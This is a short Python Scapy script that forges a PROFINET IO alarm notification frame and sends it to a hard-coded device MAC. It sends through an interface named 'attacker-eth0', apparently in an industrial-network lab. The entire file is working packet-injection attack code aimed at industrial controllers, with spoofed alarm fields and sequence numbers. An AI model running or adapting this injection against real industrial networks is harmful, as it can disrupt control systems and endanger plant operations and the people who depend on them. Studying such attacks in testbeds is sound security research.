from scapy.all import *
from scapy.contrib.pnio_rpc import *
from scapy.contrib.dce_rpc import *
from scapy.contrib.pnio import *

load_contrib("pnio")
load_contrib("pnio_rpc")
load_contrib("dce_rpc")


def get_alarm_msg(dst, src):
    ether = Ether(dst=dst, src=src, type=0x8892)

    cyclic_packet = ProfinetIO(frameID=0xFE01)

    rta_pdu = AlarmNotificationPDU(
        AlarmType=0,
        API=0x0,
        SlotNumber=0,
        SubslotNumber=0,
        ModuleIdentNumber=0x0,
        SubmoduleIdentNUmber=0x0,
        AlarmSpecifier=0x0,
    )

    alarm_header = Alarm_Low(
        RTA_SDU=rta_pdu,
        AlarmDstEndpoint=3,
        AlarmSrcEndpoint=3,
        PDUTypeType=0x01,
        PDUTypeVersion=0x00,
        AddFlags=1,
        SendSeqNum=0xFFFF,
        AckSeqNum=0xFFFE,
        VarPartLen=0x4,
    )

    return ether / cyclic_packet / alarm_header


msg = get_alarm_msg(dst="00:1D:9C:C7:B0:70", src="00:1D:9C:C8:BD:13")
sendp(msg, iface="attacker-eth0", verbose=False)
